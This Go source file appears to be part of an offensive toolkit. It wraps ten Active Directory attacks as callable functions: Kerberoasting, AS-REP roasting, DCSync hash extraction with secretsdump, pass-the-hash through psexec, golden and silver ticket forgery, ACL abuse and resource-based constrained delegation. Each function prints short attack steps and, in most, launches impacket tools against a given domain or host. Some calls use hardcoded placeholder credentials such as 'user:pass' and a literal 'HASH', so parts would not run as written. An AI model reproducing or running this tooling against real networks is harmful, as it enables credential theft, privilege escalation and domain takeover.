package tools

import (
	"fmt"
	"net"
	"strings"
	"time"
)

// === 1. DOMAIN-DUMP ===
func runDomainDump(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}
	output, err := RunExternalSafe("ldapdomaindump", domain)
	if err != nil {
		// Fallback: LDAP connection test
		conn, err := net.DialTimeout("tcp", domain+":389", 5*time.Second)
		if err != nil {
			return fmt.Sprintf("[DOMAIN-DUMP] LDAP port 389 closed on %s", domain), nil
		}
		conn.Close()
		return fmt.Sprintf("[DOMAIN-DUMP] %s:389 [OPEN] - ldapdomaindump not installed", domain), nil
	}
	return fmt.Sprintf("[DOMAIN-DUMP] %s\n%s", domain, output), nil
}

// === 2. BLOODHOUND-PATH ===
func runBloodhoundPath(args []string) (string, error) {
	var results []string
	results = append(results, "BloodHound Path Analysis")
	results = append(results, "")
	results = append(results, "BloodHound ingestors:")
	results = append(results, "- SharpHound (C#/.NET)")
	results = append(results, "- BloodHound.py (Python)")
	results = append(results, "- AzureHound (Azure AD)")
	results = append(results, "")
	results = append(results, "Attack Paths:")
	results = append(results, "- Shortest path to Domain Admin")
	results = append(results, "- Kerberoastable users")
	results = append(results, "- AS-REP Roastable users")
	results = append(results, "- Unconstrained delegation")
	results = append(results, "- DCSync rights")

	output, _ := RunExternalSafe("bloodhound-python", "-d", "example.com", "-u", "user", "-p", "pass")
	if output != "" {
		results = append(results, "\nOutput:\n"+output)
	}

	return fmt.Sprintf("[BLOODHOUND-PATH]\n%s", strings.Join(results, "\n")), nil
}

// === 3. KERBEROAST-HARVESTER ===
func runKerberoastHarvester(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}

	var results []string
	results = append(results, fmt.Sprintf("Domain: %s", domain))
	results = append(results, "Kerberoasting attack:")
	results = append(results, "1. Request TGS for SPN accounts")
	results = append(results, "2. Extract encrypted ticket")
	results = append(results, "3. Offline brute force (TGS-REP)")
	results = append(results, "")
	results = append(results, "Common SPNs:")
	results = append(results, "- MSSQLSvc/*")
	results = append(results, "- HTTP/*")
	results = append(results, "- CIFS/*")
	results = append(results, "- HOST/*")
	results = append(results, "- TERMSRV/*")

	output, _ := RunExternalSafe("GetUserSPNs.py", domain+"/user:pass", "-request")
	if output != "" {
		results = append(results, "\nSPNs found:\n"+output)
	}

	return fmt.Sprintf("[KERBEROAST-HARVESTER]\n%s", strings.Join(results, "\n")), nil
}

// === 4. ASREPROAST-CRACKER ===
func runASREPRoastCracker(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}

	var results []string
	results = append(results, fmt.Sprintf("Domain: %s", domain))
	results = append(results, "AS-REP Roasting:")
	results = append(results, "1. Enumerate users with 'Do not require Kerberos preauthentication'")
	results = append(results, "2. Request AS-REP without auth")
	results = append(results, "3. Crack encrypted part offline")
	results = append(results, "")
	results = append(results, "Tool: GetNPUsers.py")

	output, _ := RunExternalSafe("GetNPUsers.py", domain+"/", "-request", "-format", "hashcat")
	if output != "" {
		results = append(results, "\nAS-REP hashes:\n"+output)
	}

	return fmt.Sprintf("[ASREPROAST-CRACKER]\n%s", strings.Join(results, "\n")), nil
}

// === 5. DC-SYNC-PHANTOM ===
func runDCSyncPhantom(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}

	var results []string
	results = append(results, fmt.Sprintf("Domain: %s", domain))
	results = append(results, "DCSync attack:")
	results = append(results, "- Replicates AD changes like a DC")
	results = append(results, "- Requires DS-Replication-Get-Changes right")
	results = append(results, "- Extracts password hashes (NTLM)")
	results = append(results, "- Extracts Kerberos keys")
	results = append(results, "")
	results = append(results, "Tools:")
	results = append(results, "- secretsdump.py")
	results = append(results, "- mimikatz lsadump::dcsync")

	output, _ := RunExternalSafe("secretsdump.py", domain+"/admin:pass@dc."+domain)
	if output != "" {
		results = append(results, "\nOutput:\n"+output)
	}

	return fmt.Sprintf("[DC-SYNC-PHANTOM]\n%s", strings.Join(results, "\n")), nil
}

// === 6. PASS-THE-HASH ===
func runPassTheHash(args []string) (string, error) {
	target := "192.168.1.10"
	if len(args) > 0 {
		target = args[0]
	}
	hash := "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
	if len(args) > 1 {
		hash = args[1]
	}

	var results []string
	results = append(results, fmt.Sprintf("Target: %s", target))
	results = append(results, fmt.Sprintf("Hash: %s", hash))
	results = append(results, "")
	results = append(results, "Pass-the-Hash attack:")
	results = append(results, "- Authenticate using NTLM hash directly")
	results = append(results, "- No plaintext password needed")
	results = append(results, "- Works over SMB/PsExec/WMI")
	results = append(results, "")
	results = append(results, "Tools:")
	results = append(results, "- impacket-psexec")
	results = append(results, "- impacket-wmiexec")
	results = append(results, "- impacket-smbexec")

	output, _ := RunExternalSafe("psexec.py", "-hashes", hash, "administrator@"+target)
	if output != "" {
		results = append(results, "\nOutput:\n"+output)
	}

	return fmt.Sprintf("[PASS-THE-HASH]\n%s", strings.Join(results, "\n")), nil
}

// === 7. GOLDEN-TICKET ===
func runGoldenTicket(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}

	var results []string
	results = append(results, fmt.Sprintf("Domain: %s", domain))
	results = append(results, "Golden Ticket attack:")
	results = append(results, "1. Extract krbtgt NTLM hash")
	results = append(results, "2. Forge TGT with any user")
	results = append(results, "3. Valid for 10 years by default")
	results = append(results, "4. Works even if password changed")
	results = append(results, "")
	results = append(results, "Required: krbtgt hash")
	results = append(results, "Tool: mimikatz kerberos::golden")

	output, _ := RunExternalSafe("ticketer.py", "-nthash", "HASH", "-domain-sid", "S-1-5-21-...", domain, "/user:admin")
	if output != "" {
		results = append(results, "\nOutput:\n"+output)
	}

	return fmt.Sprintf("[GOLDEN-TICKET]\n%s", strings.Join(results, "\n")), nil
}

// === 8. SILVER-TICKET ===
func runSilverTicket(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}

	var results []string
	results = append(results, fmt.Sprintf("Domain: %s", domain))
	results = append(results, "Silver Ticket attack:")
	results = append(results, "1. Extract service account hash")
	results = append(results, "2. Forge TGS for specific service")
	results = append(results, "3. Only valid for that service")
	results = append(results, "4. Less detectable than Golden")
	results = append(results, "")
	results = append(results, "Common targets:")
	results = append(results, "- CIFS (file shares)")
	results = append(results, "- HOST (WMI)")
	results = append(results, "- HTTP (IIS)")
	results = append(results, "- MSSQLSvc (SQL Server)")

	return fmt.Sprintf("[SILVER-TICKET]\n%s", strings.Join(results, "\n")), nil
}

// === 9. ACL-ABUSER ===
func runACLAbuser(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}

	var results []string
	results = append(results, fmt.Sprintf("Domain: %s", domain))
	results = append(results, "ACL Abuse Paths:")
	results = append(results, "- ForceChangePassword")
	results = append(results, "- AddMembers")
	results = append(results, "- GenericAll")
	results = append(results, "- GenericWrite")
	results = append(results, "- WriteDacl")
	results = append(results, "- WriteOwner")
	results = append(results, "- Self")
	results = append(results, "- ExtendedRight (DCSync)")
	results = append(results, "")
	results = append(results, "Tools: PowerView, BloodHound, dacledit")

	output, _ := RunExternalSafe("dacledit.py", domain+"/user:pass", "-target", "DOMAIN\\User", "-action", "read")
	if output != "" {
		results = append(results, "\nACLs:\n"+output)
	}

	return fmt.Sprintf("[ACL-ABUSER]\n%s", strings.Join(results, "\n")), nil
}

// === 10. RBCD-ATTACKER ===
func runRBCDAttacker(args []string) (string, error) {
	domain := "example.com"
	if len(args) > 0 {
		domain = args[0]
	}

	var results []string
	results = append(results, fmt.Sprintf("Domain: %s", domain))
	results = append(results, "Resource-Based Constrained Delegation:")
	results = append(results, "1. Find computer with GenericAll/GenericWrite")
	results = append(results, "2. Set msDS-AllowedToActOnBehalfOfOtherIdentity")
	results = append(results, "3. Request S4U2self + S4U2proxy")
	results = append(results, "4. Impersonate any user to that computer")
	results = append(results, "")
	results = append(results, "Tools:")
	results = append(results, "- rbcd.py")
	results = append(results, "- PowerView Set-DomainRBCD")

	output, _ := RunExternalSafe("rbcd.py", "-delegate-from", "attacker$", "-delegate-to", "target$", "-dc-ip", "dc."+domain, domain+"/user:pass")
	if output != "" {
		results = append(results, "\nOutput:\n"+output)
	}

	return fmt.Sprintf("[RBCD-ATTACKER]\n%s", strings.Join(results, "\n")), nil
}
